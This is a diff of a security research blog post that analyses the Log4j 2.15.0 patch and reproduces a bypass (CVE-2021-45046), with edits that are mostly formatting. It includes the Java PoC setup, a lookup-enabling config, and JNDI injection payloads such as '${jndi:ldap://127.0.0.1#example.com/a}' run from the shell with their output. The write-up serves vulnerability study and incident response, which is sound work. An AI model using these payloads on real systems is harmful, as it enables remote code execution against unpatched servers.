@@ -1,12 +1,12 @@
 ---
-title: Analysing and Reproducing PoC for Log4j 2.15.0
-date: 2023-03-03T07:18:45+00:00
-bg_image: /assets/images/posts/image-1092x470.png
+title: "Analysing and Reproducing PoC for Log4j 2.15.0"
+date: "2023-03-03T07:18:45+00:00"
+bg_image: "/assets/images/posts/image-1092x470.png"
 author:
-    name: '@saldat0'
-    url: https://x.com/saldat0
+    name: "@saldat0"
+    url: "https://x.com/saldat0"
 ---
-Very shortly after the release of the patch for CVE-2021-44228, bundled by Apache as log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated as 3.7, it was later elevated to 9.0. Needless to say, it captured our attention, especially considering the incident response work we were conducting at the time. It was important for us to understand the situation to better advise our clients. There were bits and pieces of research with some screenshots of the bypass circulating the Internet, but, at the time, we didn’t really find a vulnerable environment, with good explanation and well laid out pre-requisite for the bypass to work.
+Shortly after the release of the patch for CVE-2021-44228, bundled by Apache as Log4j 2.15.0, researchers already found ways of bypassing the fix: CVE-2021-45046. In particular, for less than a couple of days, a vulnerability was discovered, and while it was initially rated 3.7 and later elevated to 9.0. Needless to say, it captured our attention, especially considering the incident response work we were conducting at the time. It was important for us to understand the situation to better advise our clients. There were bits and pieces of research with some screenshots of the bypass circulating the Internet, but, at the time, we didn’t really find a vulnerable environment, with good explanation and well-laid-out prerequisites for the bypass to work.
 
 This blog goes over the research we performed from start to finish to produce a PoC and, in the process, to very precisely understand the conditions which have to be present to successfully bypass the patch to log4j in 2.15.0.
 
@@ -14,6 +14,7 @@ This blog goes over the research we performed from start to finish to produce a 
 
 To start with, we downloaded the vulnerable 2.14.1 log4j library, as well as the patched 2.15.0:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ wget -q https://archive.apache.org/dist/logging/log4j/2.14.1/apache-log4j-2.14.1-src.tar.gz
 user@ubuntu:~/poc$ tar zxf apache-log4j-2.14.1-src.tar.gz 
@@ -31,7 +32,7 @@ With both folders ready, we used meld to have an easier time finding what was di
 
 ![](/assets/images/posts/image-20-1024x660.png)
 
-Reviewing only the modified files, we noticed interesting changes in the JndiManager class:
+Reviewing only the modified files, we noticed interesting changes in the `JndiManager` class:
 
 * Already at the beginning of the class, we saw a number of new local variables:
 
@@ -100,16 +101,17 @@ public synchronized <T> T lookup(final String name) throws NamingException {
 
 Assuming we were able to reach the same lookup function, our payload would need to comply with two new conditions:
 
-* **ALLOWED_HOSTS** – The host within the URL has to be approved
-* **ALLOWED_PROTOCOLS** – The protocol used for the query has to be approved
+- **ALLOWED_HOSTS** – The host within the URL has to be approved
+- **ALLOWED_PROTOCOLS** – The protocol used for the query has to be approved
 
 We managed to find a bit more information for these properties in the documentation:
 
-**ALLOWED_PROTOCOLS** By default the JDNI Lookup only supports the java, ldap, and ldaps protocols or no protocol. Additional protocols may be supported by specifying them on the “log4j2.allowedJndiProtocols” property.
+**ALLOWED_PROTOCOLS** By default the JDNI Lookup only supports the java, ldap, and ldaps protocols or no protocol. Additional protocols may be supported by specifying them on the `log4j2.allowedJndiProtocols` property.
 
-**ALLOWED_HOSTS** System property that adds host names or ip addresses that may be access by LDAP. When using LDAP only references to the local host name or ip address are supported along with any hosts or ip addresses listed in the “log4j2.allowedLdapHosts” property.
+**ALLOWED_HOSTS** System property that adds host names or ip addresses that may be access by LDAP. When using LDAP only references to the local host name or ip address are supported along with any hosts or ip addresses listed in the `log4j2.allowedLdapHosts` property.
 
 To verify this, we also looked at the source code. The default “allowed protocols” were:
+
 ```java
 private static final String LDAP = "ldap";
 private static final String LDAPS = "ldaps";
@@ -173,6 +175,7 @@ public class POC {
 
 After that we compiled it and ran it:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/javac -cp apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar POC.java 
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp apache-log4j-2.15.0-bin/log4j-core-2.15.0.jar:apache-log4j-2.15.0-bin/log4j-api-2.15.0.jar:. POC '${jndi:dns://test.example.com}'
@@ -182,9 +185,9 @@ Using payload: ${jndi:dns://test.example.com}
 
 While we were not expecting to be seeing a DNS request in `wireshark`, there had to be at least an error indicating that our protocol and host were wrong, but there was nothing there.
 
-Our assumption was wrong – there had to be more changes that we were not aware of. We tried with “log4j2.formatMsgNoLookups=true”, as this was mentioned in the patch, but it didn’t change anything. There was no DNS or TCP outbound or any additional errors. Because of this we went back to the documentation and stumbled on this:
+Our assumption was wrong – there had to be more changes that we were not aware of. We tried with `log4j2.formatMsgNoLookups=true`, as this was mentioned in the patch, but it didn’t change anything. There was no DNS or TCP outbound or any additional errors. Because of this we went back to the documentation and stumbled on this:
 
-Pattern layout no longer enables lookups within message text by default for cleaner API boundaries and reduced formatting overhead. The old ‘log4j2.formatMsgNoLookups’ which enabled this behavior has been removed as well as the ‘nolookups’ message pattern converter option. The old behavior can be enabled on a per-pattern basis using ‘%m{lookups}’.
+Pattern layout no longer enables lookups within message text by default for cleaner API boundaries and reduced formatting overhead. The old `log4j2.formatMsgNoLookups` which enabled this behaviour has been removed as well as the `nolookups` message pattern converter option. The old behaviour can be enabled on a per-pattern basis using `%m{lookups}`.
 
 A quick check with meld to `/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java` revealed that there no longer was a flag that we can enable for lookups unless the option was included in the config file.
 
@@ -192,7 +195,7 @@ With this in mind, we had to create a config file with a custom pattern and use 
 
 * Create a log4j2.xml configuration file in the same folder as the POC code.
 
-```markup
+```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <Configuration status="WARN">
     <Appenders>
@@ -230,6 +233,7 @@ public class POC {
 
 With these changes, we decided to test again with a slightly modified payload:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC '${jndi:ldap://example.com/a'}
 Using payload: ${jndi:ldap://example.com/a}
@@ -239,6 +243,7 @@ Using payload: ${jndi:ldap://example.com/a}
 
 We then ran it again to verify that we can use the other enabled protocols as well:
 
+{: .no-stripes}
 ```bash
 user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. POC '${java:version}'
 Using payload: ${java:version}
@@ -253,9 +258,9 @@ We reached a big problem as the [bypass](https://twitter.com/marcioalm/status/14
 
 Here we have a PoC of this:
 
+{: .no-stripes}
 ```bash
-user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. \
-> -Dsun.net.spi.nameservice.provider.1=dns,sun POC '${jndi:ldap://127.0.0.1#example.com/a}'
+user@ubuntu:~/poc$ ./jdk1.8.0_171/bin/java -cp log4j-core-2.15.0.jar:log4j-api-2.15.0.jar:. -Dsun.net.spi.nameservice.provider.1=dns,sun POC '${jndi:ldap://127.0.0.1#example.com/a}'
 Using payload: ${jndi:ldap://127.0.0.1#example.com/a}
 2021-12-24 02:45:36,290 main WARN Error looking up JNDI resource [ldap://127.0.0.1#example.com/a]. javax.naming.CommunicationException: 127.0.0.1#example.com:389 [Root exception is java.net.UnknownHostException: 127.0.0.1#example.com]
 [...snip...]
@@ -265,4 +270,10 @@ Using payload: ${jndi:ldap://127.0.0.1#example.com/a}
 
 With this, we were able to reproduce the attack and once again be in a position to achieve RCE.
 
-Our research concluded that several important requirements have to be present to be able to bypass the patch of 2.15.0. The most important ones being 1) the ability to write within a context that 2) is used within a custom pattern in an application 3) using a broad DNS resolver.
+## Conclusion
+
+Our research confirmed that while the patch in Log4j 2.15.0 introduced stricter controls, bypassing it is possible under specific conditions, such as:
+
+1. The attacker has the ability to write within a context.
+2. If a custom pattern is being used within the application.
+3. If the application makes use of a broad DNS resolver.
